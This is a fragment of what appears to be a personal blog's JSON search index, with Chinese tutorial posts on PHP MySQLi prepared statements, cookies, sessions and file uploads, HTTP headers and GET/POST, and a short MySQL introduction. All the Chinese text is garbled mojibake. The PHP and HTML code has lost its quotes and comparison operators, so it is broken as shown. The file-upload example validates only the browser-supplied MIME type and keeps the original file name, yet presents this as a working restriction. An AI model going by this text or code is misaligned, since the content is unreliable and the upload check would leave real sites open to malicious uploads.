å‚æ•°å¯ä»¥æ˜¯è¿™å››ç§å½¢å¼ï¼ši-æ•´æ•°ï¼›d-åŒç²¾åº¦æµ®ç‚¹æ•°ï¼›s-å­—ç¬¦ä¸²ï¼›b-äºŒè¿›åˆ¶blobå­˜å‚¨å¯¹è±¡ æ¯ä¸ªå‚æ•°å¿…é¡»æŒ‡å®šç±»å‹ï¼Œæ¥ä¿è¯æ•°æ®çš„å®‰å…¨æ€§ã€‚é€šè¿‡ç±»å‹çš„åˆ¤æ–­å¯ä»¥å‡å°‘SQLæ³¨å…¥æ¼æ´å¸¦æ¥çš„é£é™© $stmt-get_result() è¿™æ˜¯ä¸€ä¸ªç”¨äºä»æ‰§è¡Œé¢„å¤„ç†è¯­å¥åè·å–ç»“æœé›†çš„å‡½æ•°ã€‚åœ¨ PHP ä¸­ï¼Œä½¿ç”¨ MySQLi è¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶ï¼Œå¦‚æœä½¿ç”¨é¢„å¤„ç†è¯­å¥æ‰§è¡Œäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œä½ å¯ä»¥é€šè¿‡ $stmt-get_result() æ¥è·å–è¿™ä¸ªæŸ¥è¯¢çš„ç»“æœé›†ã€‚ è¿™ä¸ªå‡½æ•°é€šå¸¸åœ¨æ‰§è¡Œ SELECT æŸ¥è¯¢å¹¶ä¸”ç»‘å®šäº†ç»“æœå˜é‡åä½¿ç”¨ã€‚ä¾‹å­å¦‚ä¸‹ï¼š // å‡è®¾å·²ç»å‡†å¤‡å¥½äº†æ•°æ®åº“è¿æ¥ $conn å’Œé¢„å¤„ç†è¯­å¥ $stmt// æ‰§è¡Œé¢„å¤„ç†è¯­å¥$stmt-execute();// è·å–æŸ¥è¯¢ç»“æœé›†$res = $stmt-get_result();// å¤„ç†ç»“æœé›†while ($row = $res-fetch_assoc()) // å¤„ç†æ¯ä¸€è¡Œæ•°æ® // $row æ˜¯ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«äº†æŸ¥è¯¢ç»“æœä¸­çš„ä¸€è¡Œæ•°æ® echo $row[column_name] . br; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ$stmt-get_result() ç”¨äºè·å–æ‰§è¡Œé¢„å¤„ç†è¯­å¥åå¾—åˆ°çš„ç»“æœé›†ã€‚ç„¶åï¼Œä½¿ç”¨ fetch_assoc() æ–¹æ³•é€è¡Œè·å–ç»“æœé›†ä¸­çš„æ•°æ®ã€‚ é¢„å¤„ç†çš„ä¼˜ç‚¹ï¼š é¢„å¤„ç†è¯­å¥å¤§å¤§å‡å°‘äº†åˆ†ææ—¶é—´ï¼Œåªåšäº†ä¸€æ¬¡æŸ¥è¯¢ï¼ˆè™½ç„¶è¯­å¥å¤šæ¬¡æ‰§è¡Œï¼‰ã€‚ ç»‘å®šå‚æ•°å‡å°‘äº†æœåŠ¡å™¨å¸¦å®½ï¼Œä½ åªéœ€è¦å‘é€æŸ¥è¯¢çš„å‚æ•°ï¼Œè€Œä¸æ˜¯æ•´ä¸ªè¯­å¥ã€‚ é¢„å¤„ç†è¯­å¥é’ˆå¯¹SQLæ³¨å…¥æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå› ä¸ºå‚æ•°å€¼å‘é€åä½¿ç”¨ä¸åŒçš„åè®®ï¼Œä¿è¯äº†æ•°æ®çš„åˆæ³•æ€§ã€‚ ä¸‹é¢ä¸ºå¯¹ä»¥ä¸Šä»£ç çš„åˆ†æ prepare() mysqli_prepare() å‡½æ•°ç”¨äºå‡†å¤‡ä¸€æ¡SQLè¯­å¥ä»¥ä¾›æ‰§è¡Œã€‚ $mysqli - prepare(query) #é¢å‘å¯¹è±¡çš„é£æ ¼ INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) å¯ä»¥å°†é—®å·æ›¿æ¢ä¸ºæ•´å‹ï¼Œå­—ç¬¦ä¸²ï¼ŒåŒç²¾åº¦æµ®ç‚¹å‹å’Œå¸ƒå°”å€¼ $stmt-execute() è¿™è¡Œä»£ç å¯ä»¥æ£€æŸ¥é¢„ç¼–è¯‘è¯­å¥æ˜¯å¦æ‰§è¡Œï¼Œè‹¥æ‰§è¡Œäº†åˆ™ä¼šè¿”å›ä¸ä¸º0çš„å¸ƒå°”å€¼ ä»æ•°æ®åº“ä¸­è¯»å–æ•°æ®$sql = SELECT id, firstname, lastname FROM MyGuests;$result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) 0) // è¾“å‡ºæ•°æ® while($row = mysqli_fetch_assoc($result)) echo id: . $row[id]. - Name: . $row[firstname]. . $row[lastname]. br; else echo 0 ç»“æœ; åˆ†æï¼šå‡½æ•° mysqli_num_rows()åˆ¤æ–­è¿”å›çš„æ•°æ® â€‹ mysqli_fetch_assoc()å°†ç»“æœé›†æ”¾å…¥åˆ°å…³è”æ•°ç»„å¹¶å¾ªç¯è¾“å‡º â€‹ mysqli_query() å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨äºå‘ MySQL è¿æ¥å‘é€æŸ¥è¯¢æˆ–å‘½ä»¤ é¡µé¢è·³è½¬ä½¿ç”¨ headerå‡½æ•° ä¾‹å­ if ($stmt-execute()) // æ³¨å†ŒæˆåŠŸåè¿›è¡Œé¡µé¢è·³è½¬ header(Location:http://localhost:3000/index.php); // é‡å®šå‘åˆ°æ³¨å†ŒæˆåŠŸé¡µé¢ exit; // é‡å®šå‘ååŠ ä¸Š exit ç»ˆæ­¢å½“å‰è„šæœ¬æ‰§è¡Œ else echo æ•°æ®æ’å…¥å¤±è´¥; æ³¨è§£ï¼šheaderé‡Œé¢çš„Locatioæ˜¯å¿…é¡»è¦æœ‰çš„ï¼Œ Location å¤´æ¥æŒ‡å®šé‡å®šå‘çš„åœ°å€ Cookieä¸SessionCookiecookie å¸¸ç”¨äºè¯†åˆ«ç”¨æˆ·ã€‚cookie æ˜¯ä¸€ç§æœåŠ¡å™¨ç•™åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„å°æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œè¿™å°è®¡ç®—æœºå°†ä¼šå‘é€ cookieã€‚é€šè¿‡ PHPï¼Œæ‚¨èƒ½å¤Ÿåˆ›å»ºå¹¶å–å› cookie çš„å€¼ã€‚ setcookie()å‡½æ•° è¯¥å‡½æ•°ç”¨äºè®¾ç½®cookie;setcookie() å‡½æ•°å¿…é¡»ä½äº æ ‡ç­¾ä¹‹å‰ è¯­æ³•ï¼š setcokie(name,value,expire,path,domain); æ³¨é‡Šï¼šåœ¨å‘é€ cookie æ—¶ï¼Œcookie çš„å€¼ä¼šè‡ªåŠ¨è¿›è¡Œ URL ç¼–ç ï¼Œåœ¨å–å›æ—¶è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚ï¼ˆä¸ºé˜²æ­¢ URL ç¼–ç ï¼Œè¯·ä½¿ç”¨ setrawcookie() å–è€Œä»£ä¹‹ã€‚ï¼‰ ä¾‹å­ï¼šè¿‡æœŸæ—¶é—´è¢«è®¾ä¸ºä¸€ä¸ªæœˆ ?php$expire=time()+60*60*24*30;setcookie(user, runoob, $expire);?html..... å–å›Cookieçš„å€¼ $_COOKIEå˜é‡ç”¨äºå–å›cookieçš„å€¼ ?php// è¾“å‡º cookie å€¼echo $_COOKIE[user];// æŸ¥çœ‹æ‰€æœ‰ cookieprint_r($_COOKIE);? åˆ é™¤Cookie å°±æ˜¯è¦æŠŠè¿‡æœŸçš„æ—¶é—´å˜æ›´ä¸ºè¿‡å»çš„æ—¶é—´ç‚¹ ?php// è®¾ç½® cookie è¿‡æœŸæ—¶é—´ä¸ºè¿‡å» 1 å°æ—¶setcookie(user, , time()-3600);? SessionPHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„è®¾ç½®ã€‚Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ å¼€å§‹php session åœ¨æ‚¨æŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨åˆ° PHP session ä¸­ä¹‹å‰ï¼Œé¦–å…ˆå¿…é¡»å¯åŠ¨ä¼šè¯ã€‚ æ³¨é‡Šï¼šsession_start() å‡½æ•°å¿…é¡»ä½äº æ ‡ç­¾ä¹‹å‰ï¼š ?php session_start(); ?htmlbody /body/html å­˜å‚¨Sessionå˜é‡ å­˜å‚¨å’Œå–å› session å˜é‡çš„æ­£ç¡®æ–¹æ³•æ˜¯ä½¿ç”¨ PHP $_SESSION å˜é‡ï¼š ?phpsession_start();// å­˜å‚¨ session æ•°æ®$_SESSION[views]=1;?htmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headbody?php// æ£€ç´¢ session æ•°æ®echo æµè§ˆé‡ï¼š. $_SESSION[views];?/body/html é”€æ¯Session å¦‚æœæ‚¨å¸Œæœ›åˆ é™¤æŸäº› session æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ unset() æˆ– session_destroy() å‡½æ•°ã€‚ unset() å‡½æ•°ç”¨äºé‡Šæ”¾æŒ‡å®šçš„ session å˜é‡ï¼š ?phpsession_start();if(isset($_SESSION[views])) unset($_SESSION[views]);? seesion_destroy()å‡½æ•°å½»åº•é”€æ¯session: ?php session_destroy();? æ³¨é‡Šï¼šsession_destroy() å°†é‡ç½® sessionï¼Œæ‚¨å°†å¤±å»æ‰€æœ‰å·²å­˜å‚¨çš„ session æ•°æ®ã€‚ æ–‡ä»¶ä¸Šä¼ å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼š htmlbodyform action=upload_file.php method=postenctype=multipart/form-datalabel for=fileFilename:/labelinput type=file name=file id=file / br /input type=submit name=submit value=Submit //form/body/html æ ‡ç­¾çš„ enctype å±æ€§è§„å®šäº†åœ¨æäº¤è¡¨å•æ—¶è¦ä½¿ç”¨å“ªç§å†…å®¹ç±»å‹ã€‚åœ¨è¡¨å•éœ€è¦äºŒè¿›åˆ¶æ•°æ®æ—¶ï¼Œæ¯”å¦‚æ–‡ä»¶å†…å®¹ï¼Œè¯·ä½¿ç”¨ \"multipart/form-data\"ã€‚ æ ‡ç­¾çš„ typeâ€fileâ€ å±æ€§è§„å®šäº†åº”è¯¥æŠŠè¾“å…¥ä½œä¸ºæ–‡ä»¶æ¥å¤„ç†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“åœ¨æµè§ˆå™¨ä¸­é¢„è§ˆæ—¶ï¼Œä¼šçœ‹åˆ°è¾“å…¥æ¡†æ—è¾¹æœ‰ä¸€ä¸ªæµè§ˆæŒ‰é’®ã€‚ å†åˆ›å»ºä¸€ä¸ªä¸Šä¼ è„šæœ¬ï¼š ?phpif ($_FILES[file][error] 0) echo Error: . $_FILES[file][error] . br /; else echo Upload: . $_FILES[file][name] . br /; echo Type: . $_FILES[file][type] . br /; echo Size: . ($_FILES[file][size] / 1024) . Kbbr /; echo Stored in: . $_FILES[file][tmp_name]; ? é€šè¿‡ä½¿ç”¨ PHP çš„å…¨å±€æ•°ç»„ $_FILESï¼Œä½ å¯ä»¥ä»å®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„ input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯ â€œnameâ€, â€œtypeâ€, â€œsizeâ€, â€œtmp_nameâ€ æˆ– â€œerrorâ€ã€‚å°±åƒè¿™æ ·ï¼š $_FILES[file][name] - è¢«ä¸Šä¼ æ–‡ä»¶çš„åç§°$_FILES[file][type] - è¢«ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹$_FILES[file][size] - è¢«ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡$_FILES[file][tmp_name] - å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°$_FILES[file][error] - ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç  ä¸Šä¼ é™åˆ¶ åœ¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ä¸­ï¼Œå¢åŠ äº†å¯¹æ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ã€‚ç”¨æˆ·åªèƒ½ä¸Šä¼  .gif æˆ– .jpeg æ–‡ä»¶ï¼Œæ–‡ä»¶å¤§å°å¿…é¡»å°äº 20 kbï¼š ?phpif ((($_FILES[file][type] == image/gif)|| ($_FILES[file][type] == image/jpeg)|| ($_FILES[file][type] == image/pjpeg)) ($_FILES[file][size] 20000)) if ($_FILES[file][error] 0) echo Error: . $_FILES[file][error] . br /; else echo Upload: . $_FILES[file][name] . br /; echo Type: . $_FILES[file][type] . br /; echo Size: . ($_FILES[file][size] / 1024) . Kbbr /; echo Stored in: . $_FILES[file][tmp_name]; else echo Invalid file; ? ä¸Šé¢è¿™ä¸ªä¾‹å­ä¼šåœ¨æœåŠ¡å™¨çš„ PHP ä¸´æ—¶æ–‡ä»¶å¤¹åˆ›å»ºäº†ä¸€ä¸ªè¢«ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬ï¼Œè¿™ä¸ªä¸´æ—¶çš„å¤åˆ¶æ–‡ä»¶ä¼šåœ¨è„šæœ¬ç»“æŸæ—¶æ¶ˆå¤± ä¿å­˜è¢«ä¸Šä¼ çš„æ–‡ä»¶ ?phpif ((($_FILES[file][type] == image/gif)|| ($_FILES[file][type] == image/jpeg)|| ($_FILES[file][type] == image/pjpeg)) ($_FILES[file][size] 20000)) if ($_FILES[file][error] 0) echo Return Code: . $_FILES[file][error] . br /; else echo Upload: . $_FILES[file][name] . br /; echo Type: . $_FILES[file][type] . br /; echo Size: . ($_FILES[file][size] / 1024) . Kbbr /; echo Temp file: . $_FILES[file][tmp_name] . br /; if (file_exists(upload/ . $_FILES[file][name])) echo $_FILES[file][name] . already exists. ; else move_uploaded_file($_FILES[file][tmp_name], upload/ . $_FILES[file][name]); echo Stored in: . upload/ . $_FILES[file][name]; else echo Invalid file; ? ä¸Šé¢çš„è„šæœ¬æ£€æµ‹äº†æ˜¯å¦å·²å­˜åœ¨æ­¤æ–‡ä»¶ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™æŠŠæ–‡ä»¶æ‹·è´åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹","tags":["php"],"categories":["å¼€å‘"]},{"title":"httpåè®®ï¼ŒGETä»¥åŠPOST","path":"/2023/10/24/httpåè®®ï¼ŒGETä»¥åŠPOST/httpåè®®ï¼ŒGETä»¥åŠPOST/","content":"[TOC] httpåè®®httpæŠ¥æ–‡æ ¼å¼httpåè®®çš„è¯·æ±‚åŸæ–‡å’Œå“åº”æŠ¥æ–‡çš„ç»“æ„åŸºæœ¬ç›¸åŒï¼Œç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š 1.èµ·å§‹è¡Œï¼šæè¿°è¯·æ±‚æˆ–å“åº”çš„åŸºæœ¬ä¿¡æ¯ 2.å¤´éƒ¨å­—æ®µé›†åˆ(header)ï¼šä½¿ç”¨key-valueå½¢å¼æ›´è¯¦ç»†åœ°è¯´æ˜æŠ¥æ–‡ 3.æ¶ˆæ¯æ­£æ–‡(entity)ï¼šå®é™…ä¼ è¾“çš„æ•°æ®ï¼Œå®ƒä¸ä¸€å®šæ˜¯çº¯æ–‡æœ¬ï¼Œå¯ä»¥æ˜¯å›¾ç‰‡ï¼Œè§†é¢‘ç­‰äºŒè¿›åˆ¶æ•°æ® headerï¼ˆæŠ¥å¤´ï¼‰header çš„æ•´ä½“æ ¼å¼æ˜¯é”®å€¼å¯¹ç»“æ„ï¼Œæ¯ä¸ªé”®å€¼å¯¹å ä¸€è¡Œï¼Œé”®å’Œå€¼ä¹‹é—´ä½¿ç”¨ å†’å·+ç©ºæ ¼ è¿›è¡Œåˆ†å‰² ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„æŠ¥å¤´ï¼š HostHOST çš„å€¼è¡¨ç¤ºæœåŠ¡å™¨ä¸»æœºçš„åœ°å€å’Œç«¯å£ï¼ˆåœ°å€å¯ä»¥æ˜¯åŸŸåï¼Œä¹Ÿå¯ä»¥æ˜¯ IPï¼›ç«¯å£å·å¯ä»¥çœç•¥æˆ–è€…æ‰‹åŠ¨æŒ‡å®šï¼‰ Content-LengthContent-Length è¡¨ç¤º body çš„æ•°æ®é•¿åº¦ï¼Œé•¿åº¦å•ä½æ˜¯å­—èŠ‚ Content-TypeContent-Type è¡¨ç¤º body çš„æ•°æ®æ ¼å¼ï¼Œä»¥ä¸‹ä»‹ç»ä¸‰ç§è¯·æ±‚ä¸­çš„æ•°æ®æ ¼å¼ User-Agentï¼ˆç®€ç§° UAï¼‰User-Agent è¡¨ç¤ºæµè§ˆå™¨æˆ–è€…æ“ä½œç³»ç»Ÿçš„å±æ€§ ä¾‹å­ï¼šMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36 åœ¨è¿™å…¶ä¸­Windows NT 10.0; Win64; x64 è¡¨ç¤ºæ“ä½œç³»ç»Ÿä¿¡æ¯ï¼›AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36 è¡¨ç¤ºæµè§ˆå™¨ä¿¡æ¯ RefererReferer è¡¨ç¤ºè¿™ä¸ªé¡µé¢æ˜¯ä»å“ªä¸ªé¡µé¢è·³è½¬è¿‡æ¥çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„å­—æ®µ å‡è®¾æˆ‘ç”¨ bing æµè§ˆå™¨æœç´¢è›‹ç³•ï¼Œä¼šå‘ç°æœ‰çš„æœç´¢ç»“æœå¸¦æœ‰å¹¿å‘Šå­—çœ¼ï¼Œè¿™å°±ç›¸å½“äºå¹¿å‘Šä¸»åœ¨ bing æµè§ˆå™¨ç”¨æ¥å¼•æµçš„ï¼Œå½“è¯¥ç½‘ç«™çš„ç‚¹å‡»æ¬¡æ•°è¶Šå¤šï¼Œç”¨æˆ·çš„æˆäº¤é‡ä¹Ÿå°±ä¼šä¸Šå‡ï¼Œé‡‘ä¸»ç»™æµè§ˆå™¨çš„å¹¿å‘Šè´¹ä¹Ÿå°±å¢å¤šã€‚ä¸ºäº†ç»Ÿè®¡è¯¥å¹¿å‘Šåœ¨æŸä¸€æµè§ˆå™¨çš„ç‚¹å‡»æ¬¡æ•°ï¼Œå°±å¯ä»¥é€šè¿‡ Referer å­—æ®µæ¥æŸ¥çœ‹ã€‚ æˆ‘ä»¬å¯ä»¥å¯¹è¯¥ HTTP è¯·æ±‚è¿›è¡ŒæŠ“åŒ…ï¼Œå…¶ä¸­ Referer å­—æ®µçš„å€¼å°±æ˜¯ bing æµè§ˆå™¨ï¼Œå³è¡¨é¢è¯¥ç½‘é¡µæ˜¯ä» bing æµè§ˆå™¨è·³è½¬è¿‡æ¥çš„ ï¼ˆæ³¨æ„ï¼š å¦‚æœç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ URL æˆ–ç›´æ¥é€šè¿‡æ”¶è—å¤¹è®¿é—®é¡µé¢æ—¶ï¼Œæ˜¯æ²¡æœ‰ Referer çš„ï¼‰ Cookie Cookie æ˜¯æµè§ˆå™¨æä¾›çš„ä¸€ç§è®©ç¨‹åºå‘˜åœ¨æœ¬åœ°å­˜å‚¨æ•°æ®çš„èƒ½åŠ› *ä¸ºä»€ä¹ˆéœ€è¦ Cookieï¼Ÿ å¦‚æœæ²¡æœ‰ Cookieï¼Œç›´æ¥å°†è¦å­˜å‚¨çš„æ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨æ‰€åœ¨çš„ä¸»æœºçš„ç¡¬ç›˜ä¸Šï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°å¾ˆå¤§çš„å®‰å…¨é£é™©ï¼Œæ¯”å¦‚å½“ä½ ä¸å°å¿ƒæ‰“å¼€æŸä¸ªä¸å®‰å…¨çš„ç½‘ç«™ï¼Œè¯¥ç½‘ç«™å°±å¯ä»¥åœ¨ä½ çš„ç¡¬ç›˜ä¸Šå†™ä¸€ä¸ªç—…æ¯’ç¨‹åºï¼Œé‚£ä¹ˆä½ çš„ç”µè„‘å°±æŒ‚äº†ï¼å› æ­¤æµè§ˆå™¨ä¸ºäº†ä¿è¯å®‰å…¨æ€§ï¼Œå°±ç¦æ­¢ç½‘é¡µä¸­çš„ä»£ç è®¿é—®ä¸»æœºçš„ç¡¬ç›˜ï¼ˆæ— æ³•åœ¨ JS ä¸­è¯»å†™æ–‡ä»¶ï¼‰ï¼Œå› æ­¤ä¹Ÿå°±å¤±å»äº†æŒä¹…åŒ–å­˜å‚¨çš„èƒ½åŠ›ï¼Œæ•… Cookie å°±å¾ˆé‡è¦ï¼ *Cookie é‡Œé¢å­˜çš„æ˜¯ä»€ä¹ˆï¼Ÿ Cookie ä¸­å­˜å‚¨äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ˜¯é”®å€¼å¯¹ç»“æ„çš„ï¼Œé”®å€¼å¯¹ä¹‹é—´ä½¿ç”¨ ;åˆ†å‰²ï¼Œé”®å’Œå€¼ä¹‹é—´ä½¿ç”¨ åˆ†å‰² *Cookie æ¥è‡ªå“ªé‡Œï¼Œå¦‚ä½•å¾€ Cookie ä¸­å­˜å‚¨æ•°æ®ï¼Ÿ Cookie è¿™ä¸ªæ•°æ®å¯èƒ½æ˜¯å®¢æˆ·ç«¯ï¼ˆç½‘é¡µï¼‰è‡ªè¡Œé€šè¿‡ JS å†™å…¥çš„ï¼Œä¹Ÿå¯èƒ½æ¥è‡ªäºæœåŠ¡å™¨åœ¨ HTTP å“åº”çš„ header ä¸­é€šè¿‡ Set-Cookie å­—æ®µç»™æµè§ˆå™¨è¿”å›æ•°æ®ã€‚ Cookie åœ¨æµè§ˆå™¨è¿™è¾¹æ˜¯æŒ‰ç…§åŸŸåç»´åº¦æ¥å­˜å‚¨çš„ï¼Œä¾‹å¦‚æˆ‘ä»¬æ‰“å¼€ CSDN çš„é¦–é¡µï¼Œç‚¹å‡»ç½‘å€æ å·¦è¾¹çš„ä¸€æŠŠå°é”å°±èƒ½æ‰¾åˆ° Cookieï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æ‰“å¼€è¿™ä¸ªç½‘é¡µæ—¶ï¼Œç³»ç»ŸæŒ‰ç…§ä¸åŒåŸŸåè®¾ç½®äº† Cookie æ¯ä¸€ç»„éƒ½æ˜¯ä¸­éƒ½å­˜å‚¨äº† Cookieï¼Œæˆ‘ä»¬ç‚¹å¼€ csdn.net è¿™ç»„çš„ Cookie å°±èƒ½çœ‹åˆ°å…·ä½“çš„æ•°æ® é€šè¿‡æŠ“åŒ…å·¥å…·ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¾—åˆ° Cookie çš„æ•°æ®ï¼Œå¯ä»¥å‘ç°ï¼Œä¸Šè¿°ä¸­çš„é”®å’Œå€¼éƒ½æ˜¯å­˜åœ¨çš„ï¼Œä¾‹å¦‚ uuid_tt_dd *Cookie è¦åˆ°å“ªé‡Œå»ï¼Ÿ Cookie å­—æ®µä¼šåœ¨åç»­çš„è¯·æ±‚ä¸­ï¼ŒæŠŠæµè§ˆå™¨æœ¬åœ°å­˜å‚¨çš„è¿™äº›é”®å€¼å¯¹å†å‘é€å›æœåŠ¡å™¨ ä¾‹å­ï¼šä¿æŒå®¢æˆ·ç«¯çš„ç™»å½•çŠ¶æ€ *Cookie çš„ç¼ºé™·ï¼š æ¯æ¬¡è¯·æ±‚éƒ½è¦æŠŠè¯¥åŸŸåä¸‹æ‰€æœ‰çš„ Cookie é€šè¿‡ HTTP è¯·æ±‚ä¼ ç»™æœåŠ¡å™¨ï¼Œå› æ­¤ Cookie çš„å­˜å‚¨å®¹é‡æ˜¯æœ‰é™çš„ xff æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚ æ ¼å¼ï¼šX-Forwarded-For:IP GETGET æ˜¯æœ€å¸¸ç”¨çš„ HTTP æ–¹æ³•ï¼Œå¸¸ç”¨äºè·å–æœåŠ¡å™¨ä¸Šçš„æŸä¸ªèµ„æºã€‚ä»¥ä¸‹å‡ ç§æ–¹å¼éƒ½ä¼šè§¦å‘ GET æ–¹æ³•çš„è¯·æ±‚ 1.åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è¾“å…¥ URL å›è½¦æˆ–ç‚¹å‡»æµè§ˆå™¨æ”¶è—å¤¹ä¸­çš„é“¾æ¥ï¼Œæ­¤æ—¶æµè§ˆå™¨å°±ä¼šå‘é€å‡ºä¸€ä¸ª GET è¯·æ±‚ã€‚2.HTML ä¸­çš„ linkã€imgã€script ç­‰æ ‡ç­¾çš„å±æ€§ä¸­æ”¾çš„ URLï¼Œæµè§ˆå™¨ä¹Ÿä¼šæ„é€ å‡º HTTP GET è¯·æ±‚3.ä½¿ç”¨ Javascript é‡ç‚¹ ajaxï¼Œä¹Ÿèƒ½æ„é€ å‡º HTTP GET è¯·æ±‚4.å„ç§ç¼–ç¨‹è¯­è¨€ï¼ˆåªè¦èƒ½å¤Ÿè®¿é—®ç½‘ç»œï¼‰ï¼Œå°±éƒ½èƒ½å¤Ÿæ„é€ å‡º HTTP GER è¯·æ±‚ POSTPOST æ–¹æ³•ä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„æ–¹æ³•ï¼Œå¤šç”¨äºæäº¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç»™æœåŠ¡å™¨ï¼ˆå¦‚ç™»å½•é¡µé¢ï¼‰ã€‚ä»¥ä¸‹å‡ ç§æ–¹æ³•éƒ½ä¼šè§¦å‘ POST æ–¹æ³•çš„è¯·æ±‚ 1.é€šè¿‡ HTML ä¸­çš„ form æ ‡ç­¾å¯ä»¥æ„é€  POST è¯·æ±‚2.ä½¿ç”¨ JavaScript çš„ ajax å¯ä»¥æ„é€  POST è¯·æ±‚","tags":["web"]},{"title":"MySQl","path":"/2023/10/08/MySQl  max/MySQl/","content":"åœ¨MySQLä¸­æœ€å¥½æ‰€æœ‰æ•°æ®éƒ½ç”¨è‹±æ–‡è¡¨ç¤ºï¼Œä¸­æ–‡å®åœ¨æä¸æˆåŠŸï¼ï¼ï¼ æ•°æ®åº“çš„ä¸‰ç§ç±»å‹ï¼šå±‚æ¬¡æ¨¡å‹ï¼Œç½‘çŠ¶æ¨¡å‹ï¼Œå…³ç³»æ¨¡å‹ã€‚ æ•°æ®ç±»å‹å…³ç³»æ•°æ®åº“æ”¯æŒçš„æ ‡å‡†æ•°æ®ç±»å‹åŒ…æ‹¬æ•°å€¼ã€å­—ç¬¦ä¸²ã€æ—¶é—´ç­‰ æ“ä½œæ•°æ®åº“çš„èƒ½åŠ›DDLï¼šData Definition Language DDLå…è®¸ç”¨æˆ·å®šä¹‰æ•°æ®ï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºè¡¨ã€åˆ é™¤è¡¨ã€ä¿®æ”¹è¡¨ç»“æ„è¿™äº›æ“ä½œã€‚é€šå¸¸ï¼ŒDDLç”±æ•°æ®åº“ç®¡ç†å‘˜æ‰§è¡Œã€‚ DMLï¼šData Manipulation Language DMLä¸ºç”¨æˆ·æä¾›æ·»åŠ ã€åˆ é™¤ã€æ›´æ–°æ•°æ®çš„èƒ½åŠ›ï¼Œè¿™äº›æ˜¯åº”ç”¨ç¨‹åºå¯¹æ•°æ®åº“çš„æ—¥å¸¸æ“ä½œã€‚ DQLï¼šData Query Language DQLå…è®¸ç”¨æˆ·æŸ¥è¯¢æ•°æ®ï¼Œè¿™ä¹Ÿæ˜¯é€šå¸¸æœ€é¢‘ç¹çš„æ•°æ®åº“æ—¥å¸¸æ“ä½œã€‚ 